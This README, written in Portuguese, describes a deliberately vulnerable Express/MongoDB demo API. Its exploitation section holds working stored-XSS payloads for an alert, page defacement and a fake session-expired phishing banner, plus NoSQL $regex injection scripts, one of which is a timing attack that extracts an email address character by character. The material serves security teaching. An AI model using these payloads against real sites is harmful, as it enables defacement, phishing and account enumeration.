# API Injection Test

API basica em Node.js com:

- Express
- MongoDB (Mongoose)
- Validacao com Zod
- Seed com dados simulando cenario real
- Autenticacao basica com JWT

## Requisitos

- Node.js 18+
- MongoDB local ou remoto

## Instalacao

```bash
npm install
```

## Variaveis de ambiente

Crie um arquivo `.env` na raiz do projeto usando `.env.example` como base.

Exemplo:

```env
NODE_ENV=development
PORT=3000
MONGO_URI=mongodb://localhost:27017/api_injection_test
JWT_SECRET=troque_este_segredo
JWT_EXPIRES_IN=1d
```

## Rodar em desenvolvimento

```bash
npm run dev
```

## Front-end simples

Um cliente web estatico foi adicionado para testar a API.

1. Inicie a API com `npm run dev`.
2. Abra no navegador: `http://localhost:3000`.
3. Faça login com um usuario da seed para testar:
	- `admin@loja.com` / `Admin1234` (admin)
	- `joao@cliente.com` / `Cliente123` (user)

No painel, voce pode:

- Fazer login e registro
- Listar produtos
- Criar/editar/remover produtos se estiver autenticado como admin

## Rodar seed

```bash
npm run seed
```

Isso vai limpar e popular o banco com usuarios e produtos.

Usuarios criados pela seed:

- `admin@loja.com` / `Admin1234` (admin)
- `joao@cliente.com` / `Cliente123` (user)
- `mariana@cliente.com` / `Cliente123` (user)

## Endpoints

Base URL: `http://localhost:3000`

### Health

- `GET /health`

### Auth

- `POST /api/auth/register`
- `POST /api/auth/login`
- `GET /api/auth/me` (requer token)

Exemplo de login:

```json
{
	"email": "admin@loja.com",
	"password": "Admin1234"
}
```

Use o token retornado no header:

```text
Authorization: Bearer SEU_TOKEN
```

### Produtos

- `GET /api/products` (publico)
- `GET /api/products/:id` (publico)
- `POST /api/products` (admin)
- `PATCH /api/products/:id` (admin)
- `DELETE /api/products/:id` (admin)

## Estrutura

```text
src/
	app.js
	server.js
	config/
	middlewares/
	models/
	routes/
	schemas/
	scripts/
	utils/
```

## Explorando Vulnerabilidades

> **Ambientes**
> - 🔴 Projeto **inseguro** (dev): https://apiinjection-dev-8cwcq9.azurewebsites.net
> - 🟢 Projeto **corrigido** (prod): https://apiinjection-prod-1j5nxa.azurewebsites.net
> - 📦 Repositório: https://github.com/ArthurGomes11/api-injection-test

---

### 1 — Stored XSS: Pop-up de alerta

Cole o payload abaixo no campo **Nome** ao criar um produto (versão insegura).
Um atacante autenticado como admin consegue executar JavaScript no browser de todos os visitantes.

```html
<img src="x" onerror="alert('Vulnerabilidade XSS Detetada na Aplicação!');">
```

---

### 2 — Stored XSS: Imagem externa injetada

Cole no campo **Descricao** para exibir uma imagem arbitrária vinda de qualquer domínio.

```html
<img src="https://pbs.twimg.com/media/G85YFqzW8AAWmAm.jpg" style="width: 100%; height: 200px; object-fit: cover; border-radius: 8px; margin-top: 10px; display: block;">
```

---

### 3 — Stored XSS: Payload agressivo — sobrescreve a página inteira

Cole no campo **Nome** ou **Descricao**. Vai cobrir todo o conteúdo do site com uma tela preta.
Usar no final da apresentação.

```html
<style>
  body::after {
    content: "SITE HACKEADO";
    position: fixed; top: 0; left: 0;
    width: 100vw; height: 100vh;
    background-color: black; color: lime;
    font-size: 50px; text-align: center;
    padding-top: 20vh; z-index: 9999;
  }
</style>
```

---

### 4 — Stored XSS: Phishing — sessão falsa expirada

Injeta uma mensagem falsa de "sessão expirada" com link malicioso, escondendo os produtos reais.

```html
<style>
  .products-list { display: none; }
  body::before {
    content: "⚠️ SESSÃO EXPIRADA. Por favor, faça login novamente no link: bit.ly/site-falso";
    display: block; background: yellow; color: black;
    padding: 20px; font-weight: bold; text-align: center;
  }
</style>
```

---

### 5 — NoSQL Injection: Enumeração de e-mails via regex

Execute no console do browser (F12) na versão **insegura**.
O campo `email` aceita um objeto MongoDB com `$regex`, permitindo descobrir se um e-mail existe pelo tempo de resposta.

```js
fetch('/api/auth/login', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    email: { "$regex": "^j" },
    password: "senha_errada"
  })
}).then(() => console.log("Se demorou ~100ms ou mais, um email com 'j' existe"));
```

---

### 6 — NoSQL Injection + Timing Attack: Brute force de e-mail caractere a caractere

Execute no console do browser (F12) na versão **insegura**.
Combina `$regex` com medição de tempo de resposta para extrair o e-mail do admin letra por letra.

```js
async function extrairDadosEstavel() {
    const caracteres = "admin@loja.com123456789-_.";
    let descoberto = "";
    const tentativasPorLetra = 3;

    console.log("%c🛡️ Iniciando Extração de Alta Precisão...", "color: white; background: #0078d4; padding: 5px;");

    while (descoberto.length < 20) {
        let resultados = [];

        for (let char of caracteres) {
            const teste = "^" + descoberto + char;
            let somaTempos = 0;

            for (let i = 0; i < tentativasPorLetra; i++) {
                const t0 = performance.now();
                await fetch('/api/auth/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ email: { "$regex": teste }, password: "x" })
                });
                somaTempos += (performance.now() - t0);
            }

            const media = somaTempos / tentativasPorLetra;
            resultados.push({ char, media });
        }

        resultados.sort((a, b) => b.media - a.media);
        const vencedora = resultados[0];

        if (vencedora.media < 60) break;

        descoberto += vencedora.char;
        console.log(`%c[+] Confirmado: ${descoberto} (Média: ${Math.round(vencedora.media)}ms)`, "color: lime;");

        if (descoberto === "admin@loja.com") break;
    }

    console.log("%c🎯 EXTRAÇÃO FINALIZADA: " + descoberto, "color: #ff00ff; font-size: 16px; font-weight: bold;");
}

extrairDadosEstavel();
```

---

## Deploy no Azure com Terraform

Foi adicionada uma estrutura Terraform para subir a API em Azure App Service com container Docker.

- Pasta: `infra/terraform/azure`
- Guia completo: `infra/terraform/azure/README.md`

Resumo rapido:

1. Criar `terraform.tfvars` a partir de `terraform.tfvars.example`
2. Executar `terraform init && terraform apply`
3. Buildar e publicar a imagem no ACR criado
4. Acessar a URL gerada no output `web_app_url`